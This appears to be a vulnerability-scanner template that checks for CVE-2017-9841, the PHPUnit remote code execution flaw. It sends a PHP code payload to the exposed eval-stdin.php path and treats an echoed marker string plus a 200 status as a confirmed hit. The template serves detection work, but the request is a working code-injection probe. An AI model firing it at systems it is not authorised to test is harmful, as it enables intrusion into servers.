id: CVE-2017-9841
name: "PHPUnit Remote Code Execution"
severity: critical
description: "PHPUnit before 4.8.28 and 5.x before 5.6.3 allows remote code execution via the eval-stdin.php endpoint when exposed publicly."
reference: CWE-94
confidence: confirmed
requests:
  - method: POST
    path: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: '<?php echo "phpunit_rce_test";?>'
    matchers:
      - type: body
        words:
          - "phpunit_rce_test"
      - type: status
        status: [200]
    condition: and
